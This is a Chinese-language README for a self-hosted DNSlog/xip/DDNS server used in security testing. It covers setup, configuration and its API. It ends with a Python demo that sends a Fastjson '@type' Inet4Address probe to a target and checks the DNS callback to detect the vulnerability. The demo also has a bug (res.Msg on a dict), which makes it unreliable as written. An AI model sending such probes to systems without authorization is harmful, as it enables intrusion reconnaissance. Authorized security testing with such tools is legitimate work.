# 简介
---
Dnslog-Platform 改自项目 https://github.com/lanyi1998/DNSlog-GO

演示截图:

![avatar](https://github.com/lanyi1998/DNSlog-GO/raw/master/images/demo.png)

功能修改详情:  
1. 使用`gin`框架替换原生框架
2. 增加`xip`功能实现，参考`xip.io`
3. 优化部分逻辑；修改原项目子域生成逻辑，由服务端实现
4. 修改`readme`中的部分安装逻辑，由原来的`2`个域名和`1`个公网 IP 变成`1`个域名和`1`个公网 IP 
5. 增加`ddns`功能 (todo，完成`delDDns`、`getDDnsList`、`setDDns`api)

# 安装
---

参考原项目 https://github.com/lanyi1998/DNSlog-GO ，部分内容有变化

## 0.准备工作

1. 一个域名，域名提供商需要支持自定义 NS 记录
2. 一个公网IP

## 1.获取发行版

这里 https://github.com/6f3Ng/Dnslog-Paltform/releases 下载最新发行版,并解压

## 2.域名解析与公网 IP 准备

```
配置A记录，子域名ns1，解析到 7.7.7.7（你的公网ip）
配置A记录，子域名ns2，解析到 7.7.7.7（你的公网ip）
配置NS记录，子域名dns，解析到ns1.xxx.com（用于ddns）
配置NS记录，子域名dns，解析到ns2.xxx.com（用于ddns）
配置NS记录，子域名xip，解析到ns1.xxx.com（用于xip）
配置NS记录，子域名xip，解析到ns2.xxx.com（用于xip）
配置NS记录，子域名log，解析到ns1.xxx.com（用于dnslog）
配置NS记录，子域名log，解析到ns2.xxx.com（用于dnslog）
配置A记录，子域名www，解析到 7.7.7.7（你的公网ip）
```

## 3.修改配置文件 config.ini

```ini
[HTTP]
Port = 8080  //http web监听端口
Token = admin1,admin2 //多个用户token，用,分割。可以团队成员一起使用了
ConsoleDisable = false //是否关闭web页面
    
[DNS]
Domain = dns.demo.com //预留用于ddns
Xip = xip.demo.com //用于xip解析
Dnslog = log.demo.com //用于dnslog解析

[DDNS]
aaaDomain1.dns.demo.com  = 192.168.220.130
bbbDomain2.dns.demo.com  = 192.168.220.120
dddDomain4.dns.demo.com  = 127.0.0.1
aaab.dns.demo.com        = 192.168.220.1
aaabc.dns.demo.com       = 127.0.0.1
aaaDomain12.dns.demo.com = 192.168.220.129
cccDomain3.dns.demo.com  = 192.168.220.100

[admin1]
aaaDomain1.dns.demo.com = true
bbbDomain2.dns.demo.com = true
num                     = 5
aaab.dns.demo.com       = true
aaabc.dns.demo.com      = true

[admin2]
cccDomain3.dns.demo.com  = true
dddDomain4.dns.demo.com  = true
num                      = 5
aaaDomain12.dns.demo.com = true
```

## 4.启动对应系统的客户端，注意服务端重启以后，必须清空一下浏览器中的localStorage,否则会获取不到数据

## 5.注册为系统服务，随系统启动
在`/etc/systemd/system/`创建`dnslog.service`，填入以下内容
```ini
[Unit]
Description=DnsLog

[Service]
Type=simple
ExecStart=/root/dnslog/Dnslog-Paltform # 客户端文件位置
Restart=always
StartLimitInterval=5
RestartSec=5
WorkingDirectory=/root/dnslog/ # 配置文件位置

[Install]
WantedBy=multi-user.target
```
执行以下命令
```shell
systemctl start dnslog.service # 启动服务
systemctl enable dnslog.service # 设置为开机自启动
systemctl status dnslog.service # 查看dnslog运行状态
```
## 6.DDNS api
```
[GET] /api/getDDnsList [HEADER] token:token1
[GET] /api/setDDns [PARAM] domain=aaa.dns.demo.com(&ip=192.168.220.100) [HEADER] token:token1
[GET] /api/delDDns [PARAM] domain=aaa.dns.demo.com [HEADER] token:token1
```

# API Python Demo
原项目中的 api 查询实例

```python
import requests
import random
import json


class DnsLog():
    domain = ""
    token = ""
    Webserver = ""

    def __init__(self, Webserver, token):
        self.Webserver = Webserver  # dnslog的http监听地址，格式为 ip:端口
        self.token = token  # token
        # 检测DNSLog服务器是否正常
        try:
            res = requests.post("http://" + Webserver + "/api/verifyToken", json={"token": token}).json()
            self.domain = res.Msg
        except:
            exit("DnsLog 服务器连接失败")
        if res["Msg"] == "false":
            exit("DnsLog token 验证失败")

    # 生成随机子域名
    def randomSubDomain(self, length=5):
        subDomain = ''.join(random.sample('zyxwvutsrqponmlkjihgfedcba', length)) + '.' + self.domain
        return subDomain

    # 验证子域名是否存在
    def checkDomain(self, domain):
        res = requests.post("http://" + self.Webserver + "/api/verifyDns", json={"Query": domain},
                            headers={"token": self.token}).json()
        if res["Msg"] == "false":
            return False
        else:
            return True


url = "http://192.168.41.2:8090/"

dns = DnsLog("1111:8888", "admin")

subDomain = dns.randomSubDomain()

payload = {
    "b": {
        "@type": "java.net.Inet4Address",
        "val": subDomain
    }
}

requests.post(url, json=payload)

if dns.checkDomain(subDomain):
    print("存在FastJosn")
```

